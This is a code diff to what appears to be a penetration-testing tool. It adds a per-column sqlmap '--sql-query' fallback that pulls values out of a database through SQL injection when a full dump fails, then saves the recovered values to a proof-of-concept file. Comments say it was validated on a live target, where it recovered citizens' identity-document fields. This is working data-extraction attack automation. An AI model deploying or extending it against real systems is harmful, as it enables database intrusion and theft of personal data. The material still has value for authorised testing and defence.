@@ -6442,6 +6442,112 @@ def _sqlmap_dump_failed(out: str) -> bool:
     return not _sqlmap_has_real_dump_rows(out)
 
 
+def _quote_pg_ident(name: str) -> str:
+    """Safely quote a SQL identifier (schema/table/column). Doubles any internal
+    ``"`` per the SQL spec so a value like ``a";DROP TABLE x;--`` becomes the inert
+    identifier ``"a"";DROP TABLE x;--"`` instead of breaking out of the quoting and
+    injecting SQL into our own --sql-query (which runs against the live client DB).
+    Control characters that cannot occur in a real identifier are rejected."""
+    if any(ch in name for ch in ("\x00", "\n", "\r")):
+        raise ValueError(f"unsafe SQL identifier: {name!r}")
+    return '"' + name.replace('"', '""') + '"'
+
+
+def _parse_sqlmap_sql_query_rows(out: str) -> list[str]:
+    """Extract value rows from a sqlmap ``--sql-query`` result. sqlmap prints each
+    retrieved row as a line beginning ``[*] ``; its own banner lines are excluded by
+    matching their FULL format (``starting @ `` / ``ending @ `` / ``shutting down at ``)
+    so a real value that merely begins with one of those words is NOT dropped."""
+    if not out:
+        return []
+    rows = []
+    skip = ("starting @ ", "ending @ ", "shutting down at ")
+    for ln in out.splitlines():
+        s = ln.strip()
+        if s.startswith("[*] "):
+            val = s[4:].strip()
+            if val and not val.lower().startswith(skip):
+                rows.append(val)
+    return rows
+
+
+def _extract_dump_targets(extra_flags: str) -> tuple[str, str, list[str], int]:
+    """Parse -D/-T/-C/--stop out of an sqlmap extra-flags string for the targeted
+    per-column fallback. Returns (schema, table, columns, row_limit)."""
+    import shlex as _shlex
+    import re as _re
+    schema = table = ""
+    columns: list[str] = []
+    limit = 3
+    try:
+        toks = _shlex.split(extra_flags or "")
+    except ValueError:
+        toks = (extra_flags or "").split()
+    # Normalise equals/glued forms so '--columns=a,b', '-C=a,b' and '-Ca,b' all parse
+    # the same as the space-separated form (sqlmap accepts all of them).
+    norm: list[str] = []
+    for tok in toks:
+        m = _re.match(r'^(--(?:db|table|tables|column|columns|stop))=(.*)$', tok)
+        if m:
+            norm += [m.group(1), m.group(2)]; continue
+        m = _re.match(r'^(-[DTC])=?(.+)$', tok)   # -Tfoo / -C=a,b / -Dx (not bare -T)
+        if m:
+            norm += [m.group(1), m.group(2)]; continue
+        norm.append(tok)
+    toks = norm
+    i = 0
+    while i < len(toks):
+        t = toks[i]
+        nxt = toks[i + 1] if i + 1 < len(toks) else ""
+        if t in ("-D", "--db") and nxt:
+            schema = nxt; i += 2; continue
+        if t in ("-T", "--table", "--tables") and nxt:
+            table = nxt.split(",")[0]; i += 2; continue   # first table only
+        if t in ("-C", "--column", "--columns") and nxt:
+            columns = [c.strip().strip('"') for c in nxt.split(",") if c.strip()]
+            i += 2; continue
+        if t == "--stop" and nxt.isdigit():
+            limit = max(1, int(nxt)); i += 2; continue
+        i += 1
+    return schema, table, columns, limit
+
+
+def _sqlmap_targeted_extract(req_abs: str, sqli_dir: str, schema: str, table: str,
+                             columns: list[str], limit: int) -> dict[str, list[str]]:
+    """Per-column ``--sql-query`` extraction — the reflection-limited-endpoint
+    fallback. Each column is fetched as ONE short expression (which fits a limited
+    UNION reflection where a wide full-row --dump overflows it) with --no-cast and
+    explicit identifier quoting (handles mixed-case PostgreSQL columns). Validated
+    on target.example.invalid where a full --dump returned nothing but this recovered the
+    citizen IdProof/IdProofType values. Returns {column: [values]}."""
+    import shlex as _shlex
+    MAX_COLS = 20
+    if len(columns) > MAX_COLS:
+        log("warn", f"Targeted extraction capped at {MAX_COLS} of {len(columns)} columns")
+        columns = columns[:MAX_COLS]
+    try:
+        sch = f'{_quote_pg_ident(schema)}.' if schema else ''
+        tq = f'{sch}{_quote_pg_ident(table)}'
+    except ValueError as e:
+        log("warn", f"Unsafe schema/table identifier — skipping targeted extraction: {e}")
+        return {}
+    out_rows: dict[str, list[str]] = {}
+    for col in columns:
+        try:
+            cq = _quote_pg_ident(col)
+        except ValueError as e:
+            log("warn", f"Skipping unsafe column name: {e}")
+            continue
+        q = f'SELECT {cq} FROM {tq} WHERE {cq} IS NOT NULL LIMIT {int(limit)}'
+        cmd = (f'sqlmap -r {_shlex.quote(req_abs)} --batch -v0 --no-cast '
+               f'--output-dir={_shlex.quote(sqli_dir)} '
+               f'--sql-query {_shlex.quote(q)}')
+        _ok, _out = run_cmd(cmd, timeout=900, watch_file=sqli_dir,
+                            watch_phase=f"SQLQ-{col}", pty_stdin=True)
+        out_rows[col] = _parse_sqlmap_sql_query_rows(_out)
+    return out_rows
+
+
 # ── NEW: sqlmap via raw request file (--request-file) ───────────────────────────
 def run_sqlmap_request_file(req_file: str, domain: str | None = None,
                              level: int = 5, risk: int = 3,
@@ -6562,6 +6668,36 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
             ok, out = ok2, out2
         else:
             log("warn", "Tamper-less retry produced no data either — keeping original output")
+
+    # ── Targeted per-column fallback (reflection-limited endpoints) ──────────
+    # If a dump still failed (e.g. a wide table whose full rows overflow a limited
+    # UNION reflection — the-target's GetSearch autocomplete), fall back to fetching
+    # each requested -C column as ONE short --sql-query expression. This recovered
+    # the citizen IdProof/IdProofType values where the full --dump returned nothing.
+    if dump_requested and _sqlmap_dump_failed(out):
+        _schema, _table, _cols, _limit = _extract_dump_targets(extra_flags)
+        if _table and _cols:
+            log("warn", f"Full dump failed — targeted per-column --sql-query extraction "
+                        f"on {_table} ({len(_cols)} col(s)); reflection-limited endpoint")
+            extracted = _sqlmap_targeted_extract(req_abs, sqli_dir, _schema, _table, _cols, _limit)
+            nrows = sum(len(v) for v in extracted.values())
+            if nrows:
+                poc_f = os.path.join(sqli_dir, "TARGETED_EXTRACT.txt")
+                try:
+                    with open(poc_f, "w") as pf:
+                        pf.write(f"Target:  {effective_domain}\nTable:   {_schema+'.' if _schema else ''}{_table}\n\n")
+                        for c, vals in extracted.items():
+                            pf.write(f"== {_table}.{c} ({len(vals)} row(s)) ==\n" + "\n".join(vals) + "\n\n")
+                    log("crit", f"Targeted extraction recovered {nrows} value(s) → {poc_f}")
+                except OSError as e:
+                    # Don't lose recovered data to a file-write failure (e.g. macOS TCC lock).
+                    log("crit", f"Targeted extraction recovered {nrows} value(s) "
+                                f"(could not write {poc_f}: {e})")
+            else:
+                log("warn", "Targeted per-column extraction also returned nothing")
+        elif _table and not _cols:
+            log("info", f"Dump failed on a reflection-limited endpoint — add "
+                        f"-C col1,col2 to {_table} for targeted per-column PoC extraction")
 
     # ── Parse results: robust CONFIRMED-injection detection ──────────────────
     conf = _parse_sqlmap_confirmation(out)
